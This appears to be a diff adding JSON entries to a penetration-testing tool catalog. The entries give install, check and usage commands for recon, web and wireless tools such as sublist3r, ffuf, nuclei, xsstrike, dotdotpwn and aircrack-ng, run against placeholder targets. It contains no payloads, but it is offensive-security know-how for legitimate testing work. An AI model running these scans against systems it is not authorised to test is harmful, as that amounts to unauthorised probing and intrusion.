+      "install_command": "sudo apt update && (sudo apt install -y sublist3r || python3 -m pip install sublist3r)",
+      "check_command": "command -v sublist3r >/dev/null 2>&1 || command -v sublist3r.py >/dev/null 2>&1",
+      "usage": "sublist3r -d <target_host> -o reports/output/<target_host>/sublist3r.txt"
+    },
+    {
+      "name": "theharvester",
+      "description": "OSINT collection for emails, hosts, and sources.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y theharvester",
+      "check_command": "theHarvester -h",
+      "usage": "theHarvester -d <domain> -b all"
+    },
+    {
+      "name": "wafw00f",
+      "description": "Web application firewall detection.",
+      "category": "recon",
+      "install_command": "python3 -m pip install -e ./tools/wafw00f",
+      "check_command": "python3 tools/wafw00f/wafw00f/main.py -h",
+      "usage": "python3 tools/wafw00f/wafw00f/main.py <target>"
+    },
+    {
+      "name": "waybackurls",
+      "description": "Fetch archived URLs from Wayback Machine.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y waybackurls",
+      "check_command": "waybackurls -h",
+      "usage": "waybackurls <domain>"
+    },
+    {
+      "name": "whois",
+      "description": "Imported from HexStrike catalog: Whois.",
+      "category": "recon",
+      "install_command": "sudo apt update && sudo apt install -y whois",
+      "check_command": "command -v whois >/dev/null 2>&1",
+      "usage": "whois <target>"
+    },
+    {
+      "name": "xray-suite-servicescan",
+      "description": "Xray Suite service scan mode for host:port targets.",
+      "category": "recon",
+      "install_command": "python3 tools/xray_suite_tools.py check all",
+      "check_command": "python3 tools/xray_suite_tools.py check xray-suite-servicescan",
+      "usage": "python3 tools/xray_suite_tools.py run xray-suite-servicescan <target>"
+    },
+    {
+      "name": "xray-suite-subdomain",
+      "description": "Xray Suite subdomain scanner mode (license/build dependent).",
+      "category": "recon",
+      "install_command": "python3 tools/xray_suite_tools.py check all",
+      "check_command": "python3 tools/xray_suite_tools.py check xray-suite-subdomain",
+      "usage": "python3 tools/xray_suite_tools.py run xray-suite-subdomain <target>"
+    },
+    {
+      "name": "api_fuzzer",
+      "description": "Imported from HexStrike catalog: Api Fuzzer.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y api-fuzzer || python3 -m pip install api-fuzzer)",
+      "check_command": "command -v api-fuzzer >/dev/null 2>&1 || command -v api_fuzzer >/dev/null 2>&1",
+      "usage": "api-fuzzer https://<target>"
+    },
+    {
+      "name": "api_schema_analyzer",
+      "description": "Imported from HexStrike catalog: Api Schema Analyzer.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y api-schema-analyzer || python3 -m pip install api-schema-analyzer)",
+      "check_command": "command -v api-schema-analyzer >/dev/null 2>&1 || command -v api_schema_analyzer >/dev/null 2>&1",
+      "usage": "api-schema-analyzer https://<target>"
+    },
+    {
+      "name": "arjun",
+      "description": "HTTP parameter discovery for hidden GET/POST params.",
+      "category": "web",
+      "install_command": "python3 -m pip install arjun",
+      "check_command": "arjun -h",
+      "usage": "arjun -u https://<target>/search"
+    },
+    {
+      "name": "browser-agent",
+      "description": "Imported from HexStrike catalog: Browser Agent.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y katana || python3 -m pip install browser-agent)",
+      "check_command": "command -v katana >/dev/null 2>&1 || command -v browser-agent >/dev/null 2>&1 || command -v browser_agent >/dev/null 2>&1",
+      "usage": "katana https://<target>"
+    },
+    {
+      "name": "burpsuite-alternative",
+      "description": "Imported from HexStrike catalog: Burpsuite Alternative.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y burpsuite || python3 -m pip install burpsuite-alternative)",
+      "check_command": "command -v burpsuite >/dev/null 2>&1 || command -v burpsuite-alternative >/dev/null 2>&1 || command -v burpsuite_alternative >/dev/null 2>&1",
+      "usage": "burpsuite https://<target>"
+    },
+    {
+      "name": "dalfox",
+      "description": "XSS scanner with automation support.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y dalfox",
+      "check_command": "dalfox version",
+      "usage": "dalfox url https://<target>/search?q=test"
+    },
+    {
+      "name": "dirb",
+      "description": "Imported from HexStrike catalog: Dirb.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y dirb",
+      "check_command": "command -v dirb >/dev/null 2>&1",
+      "usage": "dirb https://<target>"
+    },
+    {
+      "name": "dirsearch",
+      "description": "Web path scanner for hidden files/directories.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y dirsearch",
+      "check_command": "dirsearch --help",
+      "usage": "dirsearch -u https://<target>"
+    },
+    {
+      "name": "dotdotpwn",
+      "description": "Imported from HexStrike catalog: Dotdotpwn.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y dotdotpwn",
+      "check_command": "command -v dotdotpwn >/dev/null 2>&1",
+      "usage": "dotdotpwn -m http-url -h <target>"
+    },
+    {
+      "name": "feroxbuster",
+      "description": "Recursive web content discovery tool.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y feroxbuster",
+      "check_command": "feroxbuster --version",
+      "usage": "feroxbuster -u https://<target>"
+    },
+    {
+      "name": "ffuf",
+      "description": "Fast web fuzzer for content discovery.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y ffuf",
+      "check_command": "ffuf -V",
+      "usage": "ffuf -u https://<target>/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+    },
+    {
+      "name": "gf",
+      "description": "Pattern-based grepping helper for vuln hunting pipelines.",
+      "category": "web",
+      "install_command": "go install github.com/tomnomnom/gf@latest",
+      "check_command": "gf -h",
+      "usage": "cat urls.txt | gf xss"
+    },
+    {
+      "name": "gobuster",
+      "description": "Directory, DNS, and virtual host brute-force.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y gobuster",
+      "check_command": "gobuster version",
+      "usage": "gobuster dir -u https://<target> -w /usr/share/wordlists/dirb/common.txt"
+    },
+    {
+      "name": "gospider",
+      "description": "Web crawler for deep endpoint extraction.",
+      "category": "web",
+      "install_command": "go install github.com/jaeles-project/gospider@latest",
+      "check_command": "gospider -h",
+      "usage": "gospider -s https://<target> -d 2"
+    },
+    {
+      "name": "graphql_scanner",
+      "description": "Imported from HexStrike catalog: Graphql Scanner.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y graphql-scanner || python3 -m pip install graphql-scanner)",
+      "check_command": "command -v graphql-scanner >/dev/null 2>&1 || command -v graphql_scanner >/dev/null 2>&1",
+      "usage": "graphql-scanner https://<target>"
+    },
+    {
+      "name": "hakrawler",
+      "description": "Lightweight endpoint crawler for bug bounty recon.",
+      "category": "web",
+      "install_command": "go install github.com/hakluke/hakrawler@latest",
+      "check_command": "hakrawler -h",
+      "usage": "echo https://<target> | hakrawler"
+    },
+    {
+      "name": "http-framework",
+      "description": "Imported from HexStrike catalog: Http Framework.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y httpx || python3 -m pip install http-framework)",
+      "check_command": "command -v httpx >/dev/null 2>&1 || command -v http-framework >/dev/null 2>&1 || command -v http_framework >/dev/null 2>&1",
+      "usage": "httpx https://<target>"
+    },
+    {
+      "name": "jaeles",
+      "description": "Imported from HexStrike catalog: Jaeles.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y jaeles || go install github.com/jaeles-project/jaeles@latest",
+      "check_command": "command -v jaeles >/dev/null 2>&1",
+      "usage": "jaeles scan -u https://<target>"
+    },
+    {
+      "name": "joomscan",
+      "description": "Joomla CMS security scanner and misconfiguration checker.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y joomscan",
+      "check_command": "command -v joomscan >/dev/null 2>&1",
+      "usage": "joomscan --url https://<target_host> --output reports/output/<target_host>/joomscan.txt"
+    },
+    {
+      "name": "jwt_analyzer",
+      "description": "Imported from HexStrike catalog: Jwt Analyzer.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y jwt-analyzer || python3 -m pip install jwt-analyzer)",
+      "check_command": "command -v jwt-analyzer >/dev/null 2>&1 || command -v jwt_analyzer >/dev/null 2>&1",
+      "usage": "jwt-analyzer https://<target>"
+    },
+    {
+      "name": "katana",
+      "description": "Fast web crawler for endpoint discovery.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y katana",
+      "check_command": "katana -version",
+      "usage": "katana -u https://<target>"
+    },
+    {
+      "name": "mitmproxy",
+      "description": "CLI man-in-the-middle proxy for traffic inspection and scripted request mutation.",
+      "category": "web",
+      "install_command": "python3 -m pip install mitmproxy",
+      "check_command": "command -v mitmproxy >/dev/null 2>&1 || command -v mitmdump >/dev/null 2>&1",
+      "usage": "mitmdump --listen-host 127.0.0.1 --listen-port 8081 --set flow_detail=0 --set termlog_verbosity=warn"
+    },
+    {
+      "name": "nikto",
+      "description": "Web server misconfiguration scanner.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y nikto",
+      "check_command": "nikto -Version",
+      "usage": "nikto -h https://<target>"
+    },
+    {
+      "name": "nuclei",
+      "description": "Template-based vulnerability scanner.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y nuclei",
+      "check_command": "nuclei -version",
+      "usage": "nuclei -u https://<target>"
+    },
+    {
+      "name": "paramspider",
+      "description": "Imported from HexStrike catalog: Paramspider.",
+      "category": "web",
+      "install_command": "python3 -m pip install paramspider",
+      "check_command": "command -v paramspider >/dev/null 2>&1",
+      "usage": "paramspider -d <domain>"
+    },
+    {
+      "name": "parsero",
+      "description": "robots.txt analyzer for hidden paths and disallowed entries.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y parsero || python3 -m pip install parsero)",
+      "check_command": "command -v parsero >/dev/null 2>&1",
+      "usage": "parsero -u https://<target_host> -o reports/output/<target_host>/parsero.txt"
+    },
+    {
+      "name": "qsreplace",
+      "description": "Query-string payload replacer for injection testing.",
+      "category": "web",
+      "install_command": "go install github.com/tomnomnom/qsreplace@latest",
+      "check_command": "qsreplace -h",
+      "usage": "cat urls.txt | qsreplace test"
+    },
+    {
+      "name": "uro",
+      "description": "Imported from HexStrike catalog: Uro.",
+      "category": "web",
+      "install_command": "sudo apt update && (sudo apt install -y uro || python3 -m pip install uro)",
+      "check_command": "command -v uro >/dev/null 2>&1",
+      "usage": "uro https://<target>"
+    },
+    {
+      "name": "wapiti",
+      "description": "Black-box web app vulnerability scanning.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y wapiti",
+      "check_command": "wapiti --version",
+      "usage": "wapiti -u https://<target>"
+    },
+    {
+      "name": "wfuzz",
+      "description": "Flexible web parameter and path fuzzing.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y wfuzz",
+      "check_command": "wfuzz --version",
+      "usage": "wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 https://<target>/FUZZ"
+    },
+    {
+      "name": "whatweb",
+      "description": "Web technology fingerprinting.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y whatweb",
+      "check_command": "whatweb --version",
+      "usage": "whatweb <target>"
+    },
+    {
+      "name": "wpscan",
+      "description": "Imported from HexStrike catalog: Wpscan.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y wpscan",
+      "check_command": "command -v wpscan >/dev/null 2>&1",
+      "usage": "wpscan --url https://<target>"
+    },
+    {
+      "name": "x8",
+      "description": "Imported from HexStrike catalog: X8.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y x8 || cargo install x8",
+      "check_command": "command -v x8 >/dev/null 2>&1",
+      "usage": "x8 -u https://<target>/endpoint?FUZZ=1"
+    },
+    {
+      "name": "xray-suite-crawlergo",
+      "description": "Xray Suite crawlergo dynamic crawler for endpoint discovery.",
+      "category": "web",
+      "install_command": "python3 tools/xray_suite_tools.py check all",
+      "check_command": "python3 tools/xray_suite_tools.py check xray-suite-crawlergo",
+      "usage": "python3 tools/xray_suite_tools.py run xray-suite-crawlergo <target>"
+    },
+    {
+      "name": "xray-suite-headless-browser",
+      "description": "Xray Suite headless browser renderer for JS-driven DOM capture.",
+      "category": "web",
+      "install_command": "python3 tools/xray_suite_tools.py check all",
+      "check_command": "python3 tools/xray_suite_tools.py check xray-suite-headless-browser",
+      "usage": "python3 tools/xray_suite_tools.py run xray-suite-headless-browser <target>"
+    },
+    {
+      "name": "xray-suite-webscan",
+      "description": "Xray Suite web vulnerability scanner mode.",
+      "category": "web",
+      "install_command": "python3 tools/xray_suite_tools.py check all",
+      "check_command": "python3 tools/xray_suite_tools.py check xray-suite-webscan",
+      "usage": "python3 tools/xray_suite_tools.py run xray-suite-webscan <target>"
+    },
+    {
+      "name": "xsser",
+      "description": "Imported from HexStrike catalog: Xsser.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y xsser",
+      "check_command": "command -v xsser >/dev/null 2>&1",
+      "usage": "xsser -u https://<target>/search?q=test"
+    },
+    {
+      "name": "xsstrike",
+      "description": "Advanced XSS testing framework.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y xsstrike",
+      "check_command": "xsstrike -h",
+      "usage": "xsstrike -u https://<target>/search.php?q=test"
+    },
+    {
+      "name": "zap",
+      "description": "Imported from HexStrike catalog: Zap.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y zaproxy",
+      "check_command": "command -v zap >/dev/null 2>&1",
+      "usage": "zaproxy -cmd -quickurl https://<target>"
+    },
+    {
+      "name": "zap-cli",
+      "description": "CLI wrapper for controlling OWASP ZAP daemon in scripts.",
+      "category": "web",
+      "install_command": "python3 -m pip install zapcli",
+      "check_command": "command -v zap-cli >/dev/null 2>&1 || command -v zapcli >/dev/null 2>&1",
+      "usage": "zap-cli quick-scan --self-contained --spider https://<target_host>"
+    },
+    {
+      "name": "zaproxy",
+      "description": "OWASP ZAP automation scanner for baseline and API security checks.",
+      "category": "web",
+      "install_command": "sudo apt update && sudo apt install -y zaproxy",
+      "check_command": "command -v zaproxy >/dev/null 2>&1 || command -v zap.sh >/dev/null 2>&1",
+      "usage": "zaproxy -cmd -quickurl https://<target_host> -quickout reports/output/<target_host>/zaproxy.html"
+    },
+    {
+      "name": "wifi_pentest",
+      "description": "Imported from HexStrike catalog: Wifi Pentest.",
+      "category": "wireless",
+      "install_command": "sudo apt update && (sudo apt install -y aircrack-ng || python3 -m pip install wifi-pentest)",
+      "check_command": "command -v aircrack-ng >/dev/null 2>&1 || command -v wifi_pentest >/dev/null 2>&1 || command -v wifi-pentest >/dev/null 2>&1",
+      "usage": "aircrack-ng <target>"
+    }
+  ]
+}
